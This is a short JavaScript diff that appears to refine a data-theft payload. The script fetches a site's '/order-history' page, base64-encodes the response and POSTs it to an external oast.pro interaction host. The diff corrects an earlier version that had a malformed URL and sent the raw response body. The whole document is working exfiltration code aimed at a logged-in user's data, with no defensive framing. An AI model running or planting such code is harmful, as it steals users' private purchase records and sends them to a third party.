@@ -1,14 +1,15 @@
 
+const url = "https://d14tov0gn2sl5jg9g1sgudzxavijmmgex.oast.pro";
 
 async function fetchData() {
     try {
         const response = await fetch('/order-history', {
             method: 'GET'
         });
-
-        fetch('d14tov0gn2sl5jg9g1sgudzxavijmmgex.oast.pro', {
+        data = btoa(await response.text());
+        await fetch(url, {
             method: 'POST',
-            body: response.body,
+            body: data,
         });
     } catch (error) {
         console.error('Error fetching data:', error);
